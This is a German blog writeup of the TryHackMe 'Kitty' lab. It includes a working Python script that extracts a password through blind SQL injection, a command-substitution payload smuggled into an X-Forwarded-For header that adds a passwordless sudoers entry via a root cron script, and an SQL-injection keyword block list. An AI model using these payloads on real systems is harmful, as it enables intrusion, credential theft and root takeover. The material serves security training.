---
title: Writeup THM Room Kitty
date: 2024-02-12 11:45:00 +0100
categories: [THM, Room]
tags: [sqli, sqlmap, dirsearch, pspy64]
comments: false
---


Intro

```

Kitty is working on a web application. She would like for you to see if there are any security vulnerabilities.  

Whenever you are ready, click on the **Start Machine** button to fire up the Virtual Machine. Please allow 3-5 minutes for the VM to fully start.

```

Fangen wir mit einem normalen nmap-Scan an

```
┌──(bumble㉿bumble)-[/mnt/backup/THM/kitty]
└─$ nmap -sT -Pn 10.10.212.95 -p 22,80
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-09 16:05 CET
Nmap scan report for 10.10.212.95
Host is up (0.053s latency).

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 0.15 seconds
                                                                                                                                                                                                                                            
┌──(bumble㉿bumble)-[/mnt/backup/THM/kitty]
└─$ nmap -sC -sV -Pn 10.10.212.95 -p 22,80 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-09 16:05 CET
Nmap scan report for 10.10.212.95
Host is up (0.060s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b0:c5:69:e6:dd:6b:81:0c:da:32:be:41:e3:5b:97:87 (RSA)
|   256 6c:65:ad:87:08:7a:3e:4c:7d:ea:3a:30:76:4d:04:16 (ECDSA)
|_  256 2d:57:1d:56:f6:56:52:29:ea:aa:da:33:b2:77:2c:9c (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Login
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.14 seconds


```

schauen wir uns mal die Webseite an


![Bild](/assets/Bilder/THM_Kitty/Pasted%20image%2020240209144358.png){: width="700" height="400" }

Wir sehen ein Anmeldefenster, lassen wir mal sqlmap laufen und schauen uns nebenher die Webseite an

```
┌──(bumble㉿bumble)-[/mnt/backup/THM/kitty]
└─$ sqlmap -r req.txt --level=5 --risk=3 --batch
[14:49:44] [INFO] POST parameter 'username' appears to be 'MySQL > 5.0.12 AND time-based blind (heavy query)' injectable 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
[14:49:44] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[14:49:44] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[14:50:14] [WARNING] there is a possibility that the target (or WAF/IPS) is dropping 'suspicious' requests
[14:50:14] [CRITICAL] connection timed out to the target URL. sqlmap is going to retry the request(s)
[14:50:14] [WARNING] most likely web server instance hasn't recovered yet from previous timed based payload. If the problem persists please wait for a few minutes and rerun without flag 'T' in option '--technique' (e.g. '--flush-session --technique=BEUS') or try to lower the value of option '--time-sec' (e.g. '--time-sec=2')   
```

Lassen wir mal dirsearch laufen

```
┌──(bumble㉿bumble)-[/mnt/backup/THM/kitty]
└─$ dirsearch -u http://10.10.80.136/      
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /mnt/backup/THM/kitty/reports/http_10.10.80.136/__24-02-09_14-49-04.txt

Target: http://10.10.80.136/

[14:49:04] Starting: 
[14:49:09] 403 -  277B  - /.ht_wsr.txt                                      
[14:49:09] 403 -  277B  - /.htaccess.bak1                                   
[14:49:09] 403 -  277B  - /.htaccess.sample
[14:49:09] 403 -  277B  - /.htaccess.orig                                   
[14:49:09] 403 -  277B  - /.htaccessBAK                                     
[14:49:09] 403 -  277B  - /.htaccess_orig                                   
[14:49:09] 403 -  277B  - /.htaccessOLD
[14:49:09] 403 -  277B  - /.htaccess_sc
[14:49:09] 403 -  277B  - /.htaccess_extra
[14:49:09] 403 -  277B  - /.htaccess.save
[14:49:09] 403 -  277B  - /.htaccessOLD2
[14:49:09] 403 -  277B  - /.html                                            
[14:49:09] 403 -  277B  - /.htm                                             
[14:49:09] 403 -  277B  - /.htpasswds                                       
[14:49:09] 403 -  277B  - /.htpasswd_test
[14:49:09] 403 -  277B  - /.httr-oauth                                      
[14:49:10] 403 -  277B  - /.php                                             
[14:49:31] 200 -    1B  - /config.php                                       
[14:49:42] 200 -  512B  - /index.php/login/                                 
[14:49:47] 302 -    0B  - /logout.php  ->  index.php                        
[14:50:01] 200 -  564B  - /register.php                                     
[14:50:04] 403 -  277B  - /server-status/                                   
[14:50:04] 403 -  277B  - /server-status                                    
                                                                             
Task Completed
```

Kein Erfolg, da wir keine weiteren interessanten Seiten finden

Im SQLmap sehen wir eine Protection, schauen wir uns das manuell an

Ok das erklärt warum SQL Fehlermeldugen wirft, nachdem ich einen einfachen SQLI `' OR 1=1 -- -` versucht habe


![Bild](/assets/Bilder/THM_Kitty/Pasted%20image%2020240209150727.png){: width="700" height="400" }

Also versuchen wir einen User zu erstellen


![Bild](/assets/Bilder/THM_Kitty/Pasted%20image%2020240209150754.png){: width="700" height="400" }

Versuchen wir uns nun anzumelden

![Bild](/assets/Bilder/THM_Kitty/Pasted%20image%2020240209150828.png){: width="700" height="400" }

Ok das hilft uns nicht weiter, versuchen wir weiter mit SQLI an die DB-Daten zu kommen. Versuchen wir mal UNION Payloads

Nach einigen Tests habe ich folgenden Payload gefunden wo mich zu der Welcome-Seite bringt

```
' UNION SELECT 0,0,0,0;-- -
```

Das heißt das die DB 4 Spalten hier ausgeben würde, welche ich nutzen kann um an die DB-Informationen zu kommen.

Hierfür muss ich leider ein Python-Script schreiben, da SQLMAP hier mir nicht auf die Schnelle helfen konnte.

Die Idee ist quasi den DB-Werte per Scirpt zu brute-forcen

folgendes Basic-Script habe ich verwendet

```
import requests

ip = "kitty.thm"
chars_list = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_-/:~$^ "
c = ""

while True:
    for i in chars_list:
        post_data= {"username":f"' UNION SELECT 1,2,3,4 WHERE database() LIKE BINARY '{c+i}%' -- -","password":"test"}
        req = requests.post(f"http://{ip}/index.php", data=post_data,allow_redirects=False)
        status_code=req.status_code
        print(f"{i}", end='\r')
        if status_code == 302:
            c = c+i
            print(f"[+] Updated Result ==> {c}")
            break
        elif i == " " :
            print("\n[+] Injection Finished")
            print(f"[+] Result ==> {c}")
            exit()
```

Folgende DB Information erhalte ich.

```
┌──(bumble㉿bumble)-[/mnt/backup/THM/kitty]
└─$ python3 exploit.py       
[+] Updated Result ==> m
[+] Updated Result ==> my
[+] Updated Result ==> myw
[+] Updated Result ==> mywe
[+] Updated Result ==> myweb
[+] Updated Result ==> mywebs
[+] Updated Result ==> mywebsi
[+] Updated Result ==> mywebsit
[+] Updated Result ==> mywebsite
 
[+] Injection Finished
[+] Result ==> mywebsite

```

Ok passen wir den query an um mehr Informationen zu erhalten

```
UNION SELECT 1,2,3,4 FROM information_schema.tables WHERE table_schema = 'mywebsite' AND table_name LIKE BINARY '{c+i}%' -- -
```

```
┌──(bumble㉿bumble)-[/mnt/backup/THM/kitty]
└─$ python3 exploit.py
[+] Updated Result ==> s
[+] Updated Result ==> si
[+] Updated Result ==> sit
[+] Updated Result ==> site
[+] Updated Result ==> siteu
[+] Updated Result ==> siteus
[+] Updated Result ==> siteuse
[+] Updated Result ==> siteuser
[+] Updated Result ==> siteusers
 
[+] Injection Finished
[+] Result ==> siteusers
```

Ok super wir haben eine Table, normalerweise speichert man Werte wie Username in der Spalte "usernames", versuchen wir hier etwas zu erhalten

```
UNION SELECT 1,2,3,4 from siteusers where username LIKE BINARY '{c+i}%' -- -
```

```
┌──(bumble㉿bumble)-[/mnt/backup/THM/kitty]
└─$ python3 exploit.py
[+] Updated Result ==> k
[+] Updated Result ==> ki
[+] Updated Result ==> kit
[+] Updated Result ==> kitt
[+] Updated Result ==> kitty
 
[+] Injection Finished
[+] Result ==> kitty

```

Jetzt noch ein Password

```
UNION SELECT 1,2,3,4 from siteusers where username = 'kitty' and password LIKE BINARY '{c+i}%' -- -
```

```
┌──(bumble㉿bumble)-[/mnt/backup/THM/kitty]
└─$ python3 exploit.py
[+] Updated Result ==> L
[+] Updated Result ==> L0
[+] Updated Result ==> L0n
[+] Updated Result ==> L0ng
[+] Updated Result ==> L0ng_
[+] Updated Result ==> L0ng_L
[+] Updated Result ==> L0ng_Li
[+] Updated Result ==> L0ng_Liv
[+] Updated Result ==> L0ng_Liv3
[+] Updated Result ==> L0ng_Liv3_
[+] Updated Result ==> L0ng_Liv3_K
[+] Updated Result ==> L0ng_Liv3_Ki
[+] Updated Result ==> L0ng_Liv3_Kit
[+] Updated Result ==> L0ng_Liv3_Kitt
[+] Updated Result ==> L0ng_Liv3_KittY
 
[+] Injection Finished
[+] Result ==> L0ng_Liv3_KittY

```

Ok versuchen wir uns mit diesem Zugangsdaten per SSH anzumelden, das super klappt und ich die User-Flag erhalte

```
┌──(bumble㉿bumble)-[/mnt/backup/THM/kitty]
└─$ ssh kitty@kitty.thm   
kitty@kitty:~$ cat user.txt 
THM{31e606998972c3c6baae67bab463b16a}

```

Starten wir mit linpeas, leider ohne Erfolg.
Versuchen wir pspy

```
2024/02/12 10:10:01 CMD: UID=0    PID=27082  | /bin/sh -c /usr/bin/bash /opt/log_checker.sh 
2024/02/12 10:10:01 CMD: UID=0    PID=27084  | /usr/bin/bash /opt/log_checker.sh 
```

Das sieht interessant aus

schauen wir uns das Script mal an

```
kitty@kitty:~$ cat /opt/log_checker.sh
#!/bin/sh
while read ip;
do
  /usr/bin/sh -c "echo $ip >> /root/logged";
done < /var/www/development/logged
cat /dev/null > /var/www/development/logged

```

Ok versuchen wir mehr Informationen hierfür zu bekomme

```
$evilwords = ["/sleep/i", "/0x/i", "/\*\*/", "/-- [a-z0-9]{4}/i", "/ifnull/i", "/ or /i"];
foreach ($evilwords as $evilword) {
        if (preg_match( $evilword, $username )) {
                echo 'SQL Injection detected. This incident will be logged!';
                $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
                $ip .= "\n";
                file_put_contents("/var/www/development/logged", $ip);
                die();
        } elseif (preg_match( $evilword, $password )) {
                echo 'SQL Injection detected. This incident will be logged!';
                $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
                $ip .= "\n";
                file_put_contents("/var/www/development/logged", $ip);
                die();
        }
}

```

Perfekt hier haben wir unseren Angriffspunkt beim Dev-Server wo als root läuft.
Ziel ist es im HTTP_X_Forwarded_For Header meinen Payload zu platzieren.
Der DevServer läuft intern auf Port 8080. 

Versuchen wir mit curl einfach zu testen

```
kitty@kitty:/var/www/development$ curl 127.0.0.1:8080 -d "username=aaa' or 1=1-- -&password=aaa" -H "X-Forwarded-For: bumble"

SQL Injection detected. This incident will be logged!
kitty@kitty:/var/www/development$ cat logged
bumble

```

Folgenden Payload habe ich dann verwendet

```
kitty@kitty:/var/www/development$ curl 127.0.0.1:8080 -d "username=aaa' or 1=1-- -&password=aaa" -H "X-Forwarded-For: \$(echo 'kitty ALL=(ALL:ALL) NOPASSWD:ALL' >> /etc/sudoers)"

SQL Injection detected. This incident will be logged!
kitty@kitty:/var/www/development$ sudo -l
Matching Defaults entries for kitty on kitty:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User kitty may run the following commands on kitty:
    (ALL : ALL) NOPASSWD: ALL
kitty@kitty:/var/www/development$ sudo ls /root
logged  root.txt  snap
kitty@kitty:/var/www/development$ sudo cat /root/root.txt
THM{581bfc26b53f2e167a05613eecf039bb}

```